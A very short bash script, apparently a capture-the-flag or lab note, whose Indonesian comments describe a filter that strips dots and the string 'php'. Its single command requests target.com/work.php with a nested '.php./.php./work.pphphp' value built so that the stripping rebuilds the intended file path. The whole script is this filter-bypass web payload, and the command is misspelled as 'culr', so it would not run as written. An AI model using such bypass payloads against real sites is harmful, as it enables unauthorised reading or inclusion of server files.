#!/usr/bin/env bash

#titik2 di replace menjadi empty string
#php di replace menjadi empty string
culr target.com/work.php?project=.php./.php./work.pphphp
